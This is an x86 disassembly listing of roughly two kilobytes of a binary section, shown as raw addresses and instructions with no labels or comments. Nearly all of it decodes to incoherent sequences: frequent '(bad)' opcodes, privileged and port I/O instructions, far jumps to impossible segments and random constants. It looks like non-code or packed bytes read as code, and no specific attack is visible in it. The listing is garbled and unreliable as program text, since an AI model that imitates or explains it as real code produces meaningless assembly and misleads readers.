  4128fd:	mov    es,WORD PTR [ecx+0x9891b0e]
  412903:	adc    eax,0x2493e9be
  412908:	mov    DWORD PTR [ebx+0x6d],esi
  41290b:	mov    DWORD PTR [ecx+eax*8-0x28],ebp
  41290f:	pop    ss
  412910:	(bad)  
  412911:	mov    ecx,0xeddbf42
  412916:	je     0x412946
  412918:	icebp  
  412919:	push   ecx
  41291a:	mov    bh,0x1f
  41291c:	jbe    0x412900
  41291e:	cs lahf 
  412920:	push   ebp
  412921:	inc    esi
  412922:	fist   DWORD PTR gs:[eax-0x7f]
  412926:	inc    ebx
  412927:	sub    al,0x2c
  412929:	xchg   ebp,eax
  41292a:	push   edx
  41292b:	mov    al,ds:0x2133d8a9
  412930:	inc    esp
  412931:	sub    DWORD PTR [edi],ebx
  412933:	out    dx,eax
  412934:	inc    esp
  412935:	mov    edi,0x4224aa1
  41293a:	loope  0x412915
  41293c:	push   ebx
  41293d:	mov    dh,0x45
  41293f:	pop    ds
  412940:	inc    esp
  412941:	push   ecx
  412942:	dec    ebp
  412943:	and    al,0xfa
  412945:	fsubr  st,st(2)
  412947:	loope  0x41291f
  412949:	sbb    BYTE PTR [ebx-0x31],0x18
  41294d:	mov    al,0xcf
  41294f:	in     al,dx
  412950:	call   0x2f272949
  412955:	adc    DWORD PTR [esi],0x83268026
  41295b:	add    edx,DWORD PTR [ebp-0x28b2d731]
  412961:	out    dx,eax
  412962:	into   
  412963:	retf   0xcf5e
  412966:	fs (bad) 
  412968:	mov    ds:0x6c8e74da,eax
  41296d:	and    BYTE PTR [edx+ebx*8+0x347ea6aa],0x1e
  412975:	push   cs
  412976:	add    edx,ecx
  412978:	xor    BYTE PTR [ebx+ebx*2],al
  41297b:	mov    ebx,0x5832ec30
  412980:	inc    ebx
  412981:	shr    BYTE PTR [ecx+0xa],cl
  412984:	add    al,0x76
  412986:	push   es
  412987:	and    ebx,DWORD PTR [ecx]
  412989:	clc    
  41298a:	test   DWORD PTR ds:0x51fd2cb1,0x55451f4f
  412994:	sub    cl,BYTE PTR [esp+edx*2]
  412997:	push   esi
  412998:	adc    esi,ecx
  41299a:	pop    esp
  41299b:	cmc    
  41299c:	aaa    
  41299d:	sub    eax,0x5e17e2b9
  4129a2:	push   0x72
  4129a4:	ins    DWORD PTR es:[edi],dx
  4129a5:	mov    eax,ds:0x5c155800
  4129aa:	retf   
  4129ab:	int3   
  4129ac:	mov    edx,0x7fea81f2
  4129b1:	and    BYTE PTR [edx-0xb],0xb0
  4129b5:	outs   dx,BYTE PTR ds:[esi]
  4129b6:	mov    ebx,0xcfa3ecb2
  4129bb:	loopne 0x4129ac
  4129bd:	rcr    DWORD PTR [ecx+0x5d],1
  4129c0:	jne    0x412943
  4129c2:	call   0xa7e7:0x88add8f7
  4129c9:	jnp    0x4129c4
  4129cb:	mov    dl,BYTE PTR [ebx+0x26]
  4129ce:	pop    ecx
  4129cf:	inc    esp
  4129d0:	sahf   
  4129d1:	les    esp,FWORD PTR [edi+0x15]
  4129d4:	cmp    eax,0x71561c6e
  4129d9:	sbb    ah,BYTE PTR [esi+0x64358e67]
  4129df:	repz clc 
  4129e1:	ret    
  4129e2:	or     eax,ebx
  4129e4:	and    DWORD PTR [ecx],ebp
  4129e6:	pop    ss
  4129e7:	jae    0x4129b6
  4129e9:	sub    ebx,0xffffffd9
  4129ec:	inc    edi
  4129ed:	lahf   
  4129ee:	dec    ebp
  4129ef:	addr16 mov ebp,0xc92efdd4
  4129f5:	wrmsr  
  4129f7:	(bad)  
  4129f8:	sbb    dl,ah
  4129fa:	sbb    cl,BYTE PTR [eax-0x59]
  4129fd:	pop    ss
  4129fe:	call   0x5d7e9659
  412a03:	xor    BYTE PTR [eax+0x54],cl
  412a06:	bound  esp,QWORD PTR [edi-0x7a]
  412a09:	jne    0x412a41
  412a0b:	cmc    
  412a0c:	les    esp,FWORD PTR [ecx-0x79334700]
  412a12:	test   eax,0x64ddff5c
  412a17:	dec    esp
  412a18:	xor    esp,esi
  412a1a:	(bad)  
  412a1b:	mov    ch,0x5f
  412a1d:	int3   
  412a1e:	adc    eax,0xf774c64b
  412a23:	adc    DWORD PTR [eax],edx
  412a25:	inc    ebx
  412a26:	pushf  
  412a27:	jnp    0x412a11
  412a29:	jb     0x412a4c
  412a2b:	inc    ecx
  412a2c:	xchg   edi,eax
  412a2d:	and    DWORD PTR [ebx*4+0x3ffb4c21],0xffffffb4
  412a35:	out    0xb,al
  412a37:	mov    al,0xce
  412a39:	jecxz  0x412a1a
  412a3b:	dec    ebp
  412a3c:	dec    ecx
  412a3d:	jae    0x412a02
  412a3f:	int3   
  412a40:	mov    BYTE PTR [edi-0x7e],ah
  412a43:	sbb    eax,0xa4907b03
  412a48:	mov    ch,ch
  412a4a:	or     bl,BYTE PTR ds:0x2290671d
  412a50:	lea    esi,[ebx]
  412a52:	mov    cl,BYTE PTR [ecx+0x5eec6596]
  412a58:	outs   dx,BYTE PTR ds:[esi]
  412a59:	and    ebx,DWORD PTR [ebx-0x4c]
  412a5c:	jno    0x412a35
  412a5e:	jl     0x412a86
  412a60:	and    dl,bl
  412a62:	mov    ds:0xc987bef8,al
  412a67:	stos   DWORD PTR es:[edi],eax
  412a68:	and    DWORD PTR [esi+0x51],ecx
  412a6b:	sbb    esi,DWORD PTR [ebp-0x7235085e]
  412a71:	push   ecx
  412a72:	out    dx,al
  412a73:	add    DWORD PTR [ebx],eax
  412a75:	or     al,cl
  412a77:	dec    edx
  412a78:	mov    cl,0x27
  412a7a:	adc    esp,DWORD PTR [esp+ecx*1-0x8]
  412a7e:	mov    bh,0xc5
  412a80:	xchg   esp,eax
  412a81:	push   es
  412a82:	(bad)
  412a86:	cmp    eax,0x9d80012c
  412a8b:	sub    cl,BYTE PTR [esi-0x4f]
  412a8e:	lahf   
  412a8f:	loopne 0x412a5e
  412a91:	push   es
  412a92:	(bad)  
  412a93:	jnp    0x412aca
  412a95:	fnstenv [ecx+0x4cc2c333]
  412a9b:	xor    BYTE PTR [eax-0xd74bc4f],0x6a
  412aa2:	daa    
  412aa3:	inc    ebp
  412aa4:	ds and eax,0x323ccae4
  412aaa:	test   BYTE PTR [esi],al
  412aac:	(bad)  
  412aae:	and    edi,DWORD PTR [eax-0x725b06f1]
  412ab4:	add    al,0x65
  412ab6:	jne    0x412a8b
  412ab8:	data16 or ch,BYTE PTR [eax]
  412abb:	inc    edi
  412abc:	mov    esi,0x2fa27db0
  412ac1:	or     BYTE PTR [edx*2+0x5b42e010],dl
  412ac8:	jg     0x412b0a
  412aca:	or     bl,bl
  412acc:	cmp    edi,DWORD PTR [edx+0x7dd8c0e7]
  412ad2:	retf   0xd2ab
  412ad5:	retf   
  412ad6:	push   ss
  412ad7:	push   ss
  412ad8:	mov    ?,WORD PTR [edi]
  412ada:	in     al,dx
  412adb:	repnz mov dh,cl
  412ade:	shl    cl,0x65
  412ae1:	loope  0x412b47
  412ae3:	dec    eax
  412ae4:	(bad)  
  412ae5:	mov    bh,0xc9
  412ae7:	outs   dx,DWORD PTR ds:[esi]
  412ae8:	(bad)  
  412ae9:	push   edi
  412aea:	(bad)  
  412aeb:	in     al,0x32
  412aed:	dec    ecx
  412aee:	lods   al,BYTE PTR ds:[esi]
  412aef:	sbb    edx,DWORD PTR [ecx-0xc]
  412af2:	ja     0x412b0d
  412af4:	retf   
  412af5:	xor    ebp,DWORD PTR [eax+0x2a]
  412af8:	mov    ebp,0xb1b989be
  412afd:	and    cl,BYTE PTR [edi]
  412aff:	scas   eax,DWORD PTR es:[edi]
  412b00:	dec    eax
  412b01:	test   al,0x25
  412b03:	jge    0x412b5b
  412b05:	push   esp
  412b06:	xchg   BYTE PTR [ebp+0x8],al
  412b09:	add    eax,0xccae6bff
  412b0e:	add    dh,BYTE PTR [edi+0x29]
  412b11:	retf   0x59ca
  412b14:	sbb    eax,0x967b73ce
  412b19:	add    eax,0x57bfddb5
  412b1e:	lock ret 0xa1f0
  412b22:	sbb    dl,BYTE PTR [ebp+0x5b]
  412b25:	rcr    DWORD PTR [esi-0x21],0x76
  412b29:	xchg   ebx,eax
  412b2a:	push   cs
  412b2b:	inc    esi
  412b2c:	xor    al,0xbe
  412b2e:	int3   
  412b2f:	(bad)  
  412b31:	adc    dh,bh
  412b33:	fstp   QWORD PTR [ebx+0x3]
  412b36:	scas   al,BYTE PTR es:[edi]
  412b37:	nop
  412b38:	mov    ebp,DWORD PTR [esp+edx*1+0xf95efa6]
  412b3f:	fld    TBYTE PTR [ebx]
  412b41:	fnstcw WORD PTR [eax]
  412b43:	mov    BYTE PTR [edx+0x28],dh
  412b46:	sahf   
  412b47:	stos   DWORD PTR es:[edi],eax
  412b48:	mov    al,ds:0x7d8e156d
  412b4d:	and    al,bh
  412b4f:	sbb    ch,BYTE PTR [ecx+eax*4-0x50eca4fa]
  412b56:	out    0xc5,al
  412b58:	scas   al,BYTE PTR es:[edi]
  412b59:	inc    ecx
  412b5a:	jle    0x412b1a
  412b5c:	ficomp WORD PTR [esi]
  412b5e:	ficomp DWORD PTR [edi+0x3e7f04f8]
  412b64:	das    
  412b65:	rcr    BYTE PTR [edx],cl
  412b67:	cmp    al,0x9
  412b69:	jnp    0x412bd9
  412b6b:	outs   dx,DWORD PTR ds:[esi]
  412b6c:	cwde   
  412b6d:	sub    BYTE PTR [ecx],dl
  412b6f:	adc    bl,ch
  412b71:	sub    dl,BYTE PTR [ebx+0x655b94b7]
  412b77:	fsubr  st(1),st
  412b79:	or     eax,0x2040d5e0
  412b7e:	mov    ebx,0x5dcfaa8
  412b83:	addr16 cld 
  412b85:	sbb    bh,BYTE PTR [eax+0x7d]
  412b88:	dec    ecx
  412b89:	push   ds
  412b8a:	lods   eax,DWORD PTR ds:[esi]
  412b8b:	scas   eax,DWORD PTR es:[edi]
  412b8c:	mov    ebp,0x40463d95
  412b91:	dec    edx
  412b92:	pop    esp
  412b93:	push   ebp
  412b94:	jge    0x412bef
  412b96:	and    al,BYTE PTR [eax+eiz*1]
  412b99:	push   0xffffffd9
  412b9b:	daa    
  412b9c:	dec    edx
  412b9d:	xchg   ecx,eax
  412b9e:	jmp    0x412be4
  412ba0:	cmc    
  412ba1:	sti    
  412ba2:	fxch   st(0)
  412ba4:	cli    
  412ba5:	push   ebx
  412ba6:	cmp    bh,0x1b
  412ba9:	push   ebx
  412baa:	fmul   QWORD PTR [edx]
  412bac:	aas    
  412bad:	scas   al,BYTE PTR es:[edi]
  412bae:	sub    eax,0xfee82cf5
  412bb3:	and    eax,esi
  412bb5:	jg     0x412b56
  412bb7:	retf   
  412bb8:	dec    esp
  412bb9:	aas    
  412bba:	ror    DWORD PTR [ecx],cl
  412bbc:	mov    eax,ds:0x328a4543
  412bc1:	xor    ebx,DWORD PTR [esi+0x57]
  412bc4:	repnz mov cl,0x4d
  412bc7:	pop    ebx
  412bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bc9:	push   ss
  412bca:	sahf   
  412bcb:	inc    ecx
  412bcc:	cmc    
  412bcd:	jnp    0x412bf4
  412bcf:	fdiv   DWORD PTR [edi+0x77]
  412bd2:	ret    
  412bd3:	inc    DWORD PTR [edi-0x22]
  412bd6:	jno    0x412be7
  412bd8:	gs cld 
  412bda:	je     0x412c34
  412bdc:	je     0x412c5a
  412bde:	jl     0x412bd4
  412be0:	sub    ch,bh
  412be2:	push   eax
  412be3:	int3   
  412be4:	add    al,0x44
  412be6:	push   cs
  412be7:	aas    
  412be8:	jae    0x412c0d
  412bea:	xlat   BYTE PTR fs:[ebx]
  412bec:	and    eax,0x67511af2
  412bf1:	(bad)  
  412bf2:	and    esp,ecx
  412bf4:	clc    
  412bf5:	fidivr WORD PTR [ecx]
  412bf7:	jb     0x412bd7
  412bf9:	stos   BYTE PTR es:[edi],al
  412bfa:	out    0xd8,al
  412bfc:	popa   
  412bfd:	popf   
  412bfe:	repnz loop 0x412b99
  412c01:	sbb    DWORD PTR [ebp+0x4672d765],0xffffffd3
  412c08:	ins    BYTE PTR es:[edi],dx
  412c09:	add    eax,0xb08da0c5
  412c0e:	jae    0x412c0b
  412c10:	jae    0x412ba9
  412c12:	out    dx,al
  412c13:	cmp    DWORD PTR [ebx+0x7c],ecx
  412c16:	sub    ah,BYTE PTR [edx-0x4c]
  412c19:	retf   0xbffc
  412c1c:	rol    BYTE PTR [eax+edx*2+0x2d],0xfc
  412c21:	lea    edi,[ebp+0x13]
  412c24:	aaa    
  412c25:	sub    al,0xa2
  412c27:	jmp    0xe4858c42
  412c2c:	ret    0x79c9
  412c2f:	iret   
  412c30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c31:	mov    esi,0x3ae19ed2
  412c36:	mov    edi,0xb5f62538
  412c3b:	out    dx,eax
  412c3c:	cmp    dh,ch
  412c3e:	pop    eax
  412c3f:	mov    edx,ebp
  412c41:	jbe    0x412ca8
  412c43:	outs   dx,DWORD PTR ds:[esi]
  412c44:	mov    dl,0x3c
  412c46:	fimul  DWORD PTR [edx]
  412c48:	es sbb edx,eax
  412c4b:	xor    DWORD PTR [edx-0x7d],ebx
  412c4e:	stos   DWORD PTR es:[edi],eax
  412c4f:	dec    esi
  412c50:	enter  0x3ff2,0xb6
  412c54:	adc    al,0xdc
  412c56:	into   
  412c57:	adc    al,0x6c
  412c59:	add    BYTE PTR [edx-0x165c73ec],bl
  412c5f:	adc    BYTE PTR [edi+0x391665e2],bh
  412c65:	retf   0x9094
  412c68:	and    al,0xf2
  412c6a:	xlat   BYTE PTR ds:[ebx]
  412c6b:	xchg   ebx,eax
  412c6c:	outs   dx,DWORD PTR ds:[esi]
  412c6d:	push   es
  412c6e:	jno    0x412c11
  412c70:	adc    dl,BYTE PTR ds:0x739c7eaf
  412c76:	ret    0x9efb
  412c79:	xchg   esp,eax
  412c7a:	xchg   ebp,eax
  412c7b:	lock dec esp
  412c7d:	mov    ds:0xdd6936b,eax
  412c82:	dec    edx
  412c83:	in     al,dx
  412c84:	retf   0x87e0
  412c87:	repz cmp bl,BYTE PTR [eax-0x5bd3b991]
  412c8e:	ror    BYTE PTR ds:0xabd35e5e,cl
  412c94:	imul   edx,ebx,0xffffffec
  412c97:	mov    ah,0x87
  412c99:	pop    edx
  412c9a:	addr16 pop esi
  412c9c:	cmp    BYTE PTR [eax+edi*4+0x75],cl
  412ca0:	xchg   DWORD PTR ds:0x3cdb1298,ebp
  412ca6:	popa   
  412ca7:	sbb    al,0xab
  412ca9:	xchg   ebx,eax
  412caa:	xor    eax,0x598fefc
  412caf:	rcr    DWORD PTR [edx+0x23],0x8b
  412cb3:	iret   
  412cb4:	pop    es
  412cb5:	pop    es
  412cb6:	aas    
  412cb7:	stc    
  412cb8:	add    DWORD PTR [eax],ecx
  412cba:	adc    dl,BYTE PTR [edi]
  412cbc:	adc    DWORD PTR [ecx+edx*2-0x5afad6ef],edx
  412cc3:	lahf   
  412cc4:	jae    0x412ccc
  412cc6:	lahf   
  412cc7:	sub    esi,DWORD PTR [eax-0x31]
  412cca:	mov    es,WORD PTR [ecx+0xf977d4e]
  412cd0:	push   ds
  412cd1:	mov    DWORD PTR [edi],esi
  412cd3:	sbb    eax,0x39842ad8
  412cd8:	jmp    0x412c83
  412cda:	loop   0x412cd3
  412cdc:	cdq    
  412cdd:	je     0x412ce0
  412cdf:	jmp    0x412d41
  412ce1:	mov    ebp,0x757b520a
  412ce6:	gs mov ah,0x6a
  412ce9:	lahf   
  412cea:	mov    cl,al
  412cec:	mov    eax,0x9fc4a16c
  412cf1:	mov    esp,0xce859e1e
  412cf6:	jmp    0x9c7277f9
  412cfb:	add    esi,DWORD PTR [eax]
  412cfd:	aas    
  412cfe:	leave  
  412cff:	icebp  
  412d00:	test   DWORD PTR [eax-0x547fbfa8],esi
  412d06:	mov    al,0x7a
  412d08:	pop    esi
  412d09:	fcmovnbe st,st(3)
  412d0b:	cli    
  412d0c:	mov    ecx,0x77566744
  412d11:	out    0x13,eax
  412d13:	into   
  412d14:	ret    0x9ac3
  412d17:	sbb    BYTE PTR [ecx+0x38],bh
  412d1a:	push   0x20
  412d1c:	div    DWORD PTR [edx-0x15080e80]
  412d22:	ss cli 
  412d24:	xor    al,bl
  412d26:	out    dx,eax
  412d27:	scas   al,BYTE PTR es:[edi]
  412d28:	adc    DWORD PTR [ecx+0x3934ee7e],esi
  412d2e:	cmp    ebp,DWORD PTR [edi+0x3a]
  412d31:	mov    eax,0xbbb9d626
  412d36:	xlat   BYTE PTR ds:[ebx]
  412d37:	jmp    0xffd4:0x51cf7
  412d3e:	je     0x412d2f
  412d40:	dec    ebp
  412d41:	add    ch,BYTE PTR [ebp+0x1e]
  412d44:	fbld   TBYTE PTR ds:[esi+0x2a]
  412d48:	mov    al,ds:0x1bc00efb
  412d4d:	cmc    
  412d4e:	popa   
  412d4f:	mov    ds:0x2b39a66f,eax
  412d54:	mov    eax,0x8214967f
  412d59:	cld    
  412d5a:	int    0xf9
  412d5c:	sbb    eax,0x498c4a50
  412d61:	ret    0x3b0d
  412d64:	(bad)  
  412d65:	out    dx,eax
  412d66:	or     ch,BYTE PTR [esi+edx*2]
  412d69:	aad    0xcb
  412d6b:	lock jns 0x412d19
  412d6e:	int    0xda
  412d70:	mov    ss,WORD PTR [eax-0x31ed1365]
  412d76:	pusha  
  412d77:	and    al,cl
  412d79:	(bad)
  412d7d:	aam    0x9a
  412d7f:	popf   
  412d80:	adc    BYTE PTR [ecx+edx*2+0x54561c23],bl
  412d87:	fcomp  QWORD PTR [ebx+0x4e]
  412d8a:	or     DWORD PTR [edi],esp
  412d8c:	and    DWORD PTR [esi-0x71aa9aa0],edi
  412d92:	ret    
  412d93:	jb     0x412e0d
  412d95:	sbb    DWORD PTR [esp+ebx*1],0xfa06b127
  412d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d9d:	popf   
  412d9e:	mov    dl,0x69
  412da0:	mov    dl,0x3
  412da2:	jbe    0x412d45
  412da4:	mov    dl,bh
  412da6:	imul   esp,DWORD PTR [ebp+0x5],0xfffffffd
  412daa:	fcomp  QWORD PTR [edx+edi*8]
  412dad:	jb     0x412d51
  412daf:	lods   eax,DWORD PTR ds:[esi]
  412db0:	shr    DWORD PTR [ebx+eax*2+0x7d],cl
  412db4:	fmul   QWORD PTR [eax-0x3e90281a]
  412dba:	das    
  412dbb:	sub    eax,0xcd742073
  412dc0:	ror    DWORD PTR [ebp+0x75],0xf4
  412dc4:	adc    DWORD PTR [ecx],eax
  412dc6:	mov    ebx,0xc1bd1f23
  412dcb:	mov    eax,ds:0x751fd6bd
  412dd0:	mov    BYTE PTR [edi],ch
  412dd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dd3:	outs   dx,DWORD PTR ds:[esi]
  412dd4:	data16 sbb BYTE PTR [ebp-0x6a81cc26],dh
  412ddb:	leave  
  412ddc:	ret    
  412ddd:	(bad)  
  412dde:	call   0x7122978c
  412de3:	jae    0x412e20
  412de5:	aaa    
  412de6:	cmp    cl,BYTE PTR [ebp+0x9]
  412de9:	or     bl,al
  412deb:	pop    edx
  412dec:	add    DWORD PTR [edx-0x45672c07],0xfffffffc
  412df3:	push   ebp
  412df4:	jecxz  0x412d92
  412df6:	jmp    0x412e68
  412df8:	enter  0x4d34,0x68
  412dfc:	or     al,0x1c
  412dfe:	add    bh,BYTE PTR [esi-0x3db8a365]
  412e04:	sub    DWORD PTR [eax-0x50],ebp
  412e07:	ds cwde 
  412e09:	sbb    BYTE PTR [edx-0x45d9eb65],dl
  412e0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e10:	xor    al,0xdb
  412e12:	fcmovb st,st(7)
  412e14:	cli    
  412e15:	or     DWORD PTR [edi-0x50],esi
  412e18:	jge    0x412db8
  412e1a:	and    cl,dl
  412e1c:	sbb    eax,0xdf2272e
  412e21:	mov    ah,0x14
  412e23:	sar    BYTE PTR [ecx-0x634d8592],cl
  412e29:	(bad)  
  412e2a:	mov    esp,0xde2ef79a
  412e2f:	jmp    0x6148:0x83b0b8f9
  412e36:	dec    esi
  412e37:	sar    al,0xe9
  412e3a:	sub    al,0xbe
  412e3c:	and    eax,0xcf5c8b53
  412e41:	fidiv  WORD PTR [ebx+0x6d]
  412e44:	add    BYTE PTR [edi-0x49],0xa1
  412e48:	sub    edx,DWORD PTR [edx]
  412e4a:	daa    
  412e4b:	rol    ah,cl
  412e4d:	sbb    DWORD PTR [edi+edx*1+0x66],edx
  412e51:	ss ret 0x67b2
  412e55:	xchg   edi,eax
  412e56:	ds jl  0x412e35
  412e59:	cwde   
  412e5a:	stos   BYTE PTR es:[edi],al
  412e5b:	bound  ebp,QWORD PTR [eax+ebx*8+0x63]
  412e5f:	nop
  412e60:	pop    esi
  412e61:	push   ebp
  412e62:	in     al,dx
  412e63:	add    edi,edi
  412e65:	pop    ebx
  412e66:	test   eax,0x906a2642
  412e6b:	adc    BYTE PTR [esi],ch
  412e6d:	mov    ebp,ss
  412e6f:	push   esi
  412e70:	pop    esi
  412e71:	mov    gs,WORD PTR ds:0xb868533c
  412e77:	jb     0x412e8e
  412e79:	call   0x2839:0x5622917b
  412e80:	sbb    esp,ecx
  412e82:	aam    0xbe
  412e84:	and    ax,0xc002
  412e88:	dec    eax
  412e89:	jbe    0x412e65
  412e8b:	jb     0x412e7b
  412e8d:	loop   0x412ec3
  412e8f:	add    ah,al
  412e91:	int3   
  412e92:	adc    al,0xe1
  412e94:	dec    edi
  412e95:	retf   0x4f8a
  412e98:	adc    DWORD PTR [edi+0x5f],esi
  412e9b:	push   0xab7f090c
  412ea0:	dec    eax
  412ea1:	in     al,0xd2
  412ea3:	sub    eax,0x481c0c8a
  412ea8:	jmp    0xeab3:0x7bf324aa
  412eaf:	jmp    0x412f06
  412eb1:	std    
  412eb2:	cmp    BYTE PTR [eax],0xc1
  412eb5:	in     eax,0x89
  412eb7:	sub    ecx,DWORD PTR ds:0xb8ea696
  412ebd:	inc    eax
  412ebe:	pop    ebx
  412ebf:	sbb    ebx,DWORD PTR [eax+0x2b221ffe]
  412ec5:	xor    bh,bh
  412ec7:	inc    ebp
  412ec8:	ror    DWORD PTR [ecx],1
  412eca:	loopne 0x412ec6
  412ecc:	adc    ch,dh
  412ece:	dec    esp
  412ecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ed0:	push   ds
  412ed1:	push   es
  412ed2:	adc    al,0xc4
  412ed4:	(bad)  
  412ed6:	aad    0xc1
  412ed8:	xor    DWORD PTR ds:0x3698023f,0xfffffffd
  412edf:	mov    edi,0xcdad0eb6
  412ee4:	and    al,0xfe
  412ee6:	fadd   DWORD PTR [ebp-0x22]
  412ee9:	push   ecx
  412eea:	(bad)  
  412eeb:	push   esp
  412eec:	mov    BYTE PTR ds:0x7046cc34,ah
  412ef2:	sbb    eax,eax
  412ef4:	fild   QWORD PTR [edi]
  412ef6:	cmp    BYTE PTR [edi],0x17
  412ef9:	cmp    dl,BYTE PTR [ebx+ebp*1]
  412efc:	scas   eax,DWORD PTR es:[edi]
  412efd:	xchg   esp,eax
  412efe:	push   0x10e6254e
  412f03:	pop    edx
  412f04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f06:	call   0x1199173f
  412f0b:	push   ebx
  412f0c:	dec    ebp
  412f0d:	adc    al,0xae
  412f0f:	sahf   
  412f10:	popa   
  412f11:	pushf  
  412f12:	jae    0x412ebe
  412f14:	jno    0x412f2f
  412f16:	sbb    ch,BYTE PTR [ecx+ebx*8-0x252a18b4]
  412f1d:	add    al,0xd9
  412f1f:	push   cs
  412f20:	test   al,0x32
  412f22:	sbb    BYTE PTR [esi-0x55],ah
  412f25:	test   eax,0x786a047c
  412f2a:	cmp    ebp,edx
  412f2c:	outs   dx,BYTE PTR ds:[esi]
  412f2d:	cmp    al,0x7b
  412f2f:	je     0x412f8e
  412f31:	inc    esp
  412f32:	pop    ds
  412f33:	adc    al,0xaf
  412f35:	fs sub dl,dl
  412f38:	mov    esp,0xb8b8b70b
  412f3d:	or     ecx,DWORD PTR [ebx+0x64]
  412f40:	push   esp
  412f41:	test   ah,0x19
  412f44:	fild   WORD PTR ds:0xcb295b8c
  412f4a:	and    al,0x5c
  412f4c:	in     al,0xf4
  412f4e:	arpl   WORD PTR [ebx],sp
  412f50:	in     al,dx
  412f51:	out    0xed,eax
  412f53:	std    
  412f54:	test   DWORD PTR [ebp-0x30],edi
  412f57:	scas   eax,DWORD PTR es:[edi]
  412f58:	sti    
  412f59:	or     eax,0xba2df0c8
  412f5e:	(bad)  
  412f5f:	(bad)  
  412f60:	fild   DWORD PTR [ecx-0x39198a3b]
  412f66:	pop    es
  412f67:	jns    0x412efa
  412f69:	popf   
  412f6a:	daa    
  412f6b:	hlt    
  412f6c:	jg     0x412fac
  412f6e:	adc    al,0xdd
  412f70:	inc    ebx
  412f71:	out    dx,eax
  412f72:	(bad)  
  412f73:	jo     0x412f21
  412f75:	mov    edi,0xa6039624
  412f7a:	add    DWORD PTR [edx-0x4fc93f69],edi
  412f80:	inc    esi
  412f81:	popa   
  412f82:	jnp    0x412f49
  412f84:	retf   
  412f85:	stc    
  412f86:	call   0x8b97:0x5a7d14b5
  412f8d:	inc    ebp
  412f8e:	mov    eax,ds:0xc224d628
  412f93:	mov    edx,0x55dfa7ac
  412f98:	adc    bl,BYTE PTR [edi+edx*8]
  412f9b:	imul   ebx,ecx,0x1e80596d
  412fa1:	xchg   ebp,eax
  412fa2:	mov    DWORD PTR [ebx-0x59],edi
  412fa5:	or     DWORD PTR [ebp+0x49],ecx
  412fa8:	jne    0x412f91
  412faa:	mov    ecx,0x7f0b3338
  412faf:	cmp    ch,bh
  412fb1:	aaa    
  412fb2:	stc    
  412fb3:	cmp    BYTE PTR [esp+edi*8-0x4f32ce71],cl
  412fba:	gs test eax,0x718efa79
  412fc0:	mov    bh,0x43
  412fc2:	sti    
  412fc3:	adc    eax,ebp
  412fc5:	push   cs
  412fc6:	xor    al,BYTE PTR [ebx+edx*4]
  412fc9:	or     ch,bl
  412fcb:	mov    dh,0xc6
  412fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fcf:	sbb    al,0xa4
  412fd1:	inc    edx
  412fd2:	push   ebx
  412fd3:	sbb    BYTE PTR [edi-0x5c9e97d1],cl
  412fd9:	loopne 0x412f80
  412fdb:	jae    0x413044
  412fdd:	mov    ah,0xb9
  412fdf:	inc    edi
  412fe0:	cmp    dh,cl
  412fe2:	mov    ecx,0xa1e68f69
  412fe7:	enter  0x172f,0x53
  412feb:	addr16 inc eax
  412fed:	stos   BYTE PTR es:[edi],al
  412fee:	mov    ebp,0x70f987f3
  412ff3:	mov    eax,ds:0xe304a41c
  412ff8:	push   ss
  412ff9:	mov    cs,WORD PTR [esi-0x5aa90c3e]
  412fff:	cmc    
  413000:	sub    al,0x2c
  413002:	mov    ah,ch
  413004:	and    al,0x7a
  413006:	xor    ebp,edi
  413008:	xor    al,0x7d
  41300a:	mov    dh,0x76
  41300c:	jle    0x413042
  41300e:	push   ebx
  41300f:	jno    0x412fc7
  413011:	push   0xffffffd8
  413013:	lea    ebx,[edi-0x2d4341c0]
  413019:	loopne 0x413028
  41301b:	call   0x8da14950
  413020:	sub    DWORD PTR [eax+0x543c7989],esp
  413026:	push   eax
  413027:	push   DWORD PTR [esi]
  413029:	inc    ebx
  41302a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41302b:	and    eax,0xa95a70b3
  413030:	push   ds
  413031:	jns    0x41302f
  413033:	jmp    0x412fd0
  413035:	(bad)  
  413036:	jge    0x41307c
  413038:	ror    cl,0x20
  41303b:	imul   ecx,DWORD PTR ds:0xf2a19329,0xfffffffc
  413042:	sub    eax,0x5b871031
  413047:	and    esp,DWORD PTR [esi+edx*1]
  41304a:	shl    DWORD PTR [edx],cl
  41304c:	es xchg ebp,eax
  41304e:	dec    esi
  41304f:	pop    edx
  413050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413051:	pusha  
  413052:	mov    dh,0x12
  413054:	jg     0x413040
  413056:	jae    0x413053
  413058:	or     DWORD PTR [edx+0x52],ecx
  41305b:	mov    eax,0xd42d90a2
  413060:	xlat   BYTE PTR ds:[ebx]
  413061:	ret    
  413062:	jmp    0xf4abeee0
  413067:	jmp    0xd014:0x62d341f9
  41306e:	(bad)  
  41306f:	shl    edi,cl
  413071:	pop    edx
  413072:	and    eax,0xd1b16be2
  413077:	push   ss
  413078:	sub    ebx,DWORD PTR [eax-0x31]
  41307b:	sbb    al,0xf1
  41307d:	(bad)  
  41307e:	push   cs
  41307f:	push   ds
  413080:	pop    eax
  413081:	mov    ebx,0x47115527
  413086:	cli    
  413087:	(bad)  
  413088:	fldcw  WORD PTR [edx+ecx*1]
  41308b:	cmp    BYTE PTR [edx+eax*1],bl
  41308e:	sub    edx,DWORD PTR [edx-0x464fb65]
  413094:	jbe    0x413074
  413096:	add    dl,bh
  413098:	loope  0x413069
  41309a:	lods   eax,DWORD PTR ds:[esi]
  41309b:	push   ecx
  41309c:	pushf  
  41309d:	ds popf 
  41309f:	shl    DWORD PTR [eax+0x42],1
  4130a2:	push   ebx
  4130a3:	outs   dx,DWORD PTR ds:[esi]
  4130a4:	or     BYTE PTR ds:[eax],ah
  4130a7:	xchg   esi,eax
  4130a8:	push   0x38
  4130aa:	xlat   BYTE PTR ds:[ebx]
  4130ab:	lds    esp,FWORD PTR [eax-0xd1a52e3]
  4130b1:	xor    ebp,esi
  4130b3:	push   0x4d225331
  4130b8:	das    
  4130b9:	hlt    
  4130ba:	cmp    DWORD PTR [ebp+edx*1-0x4b],eax
  4130be:	repnz pop ds
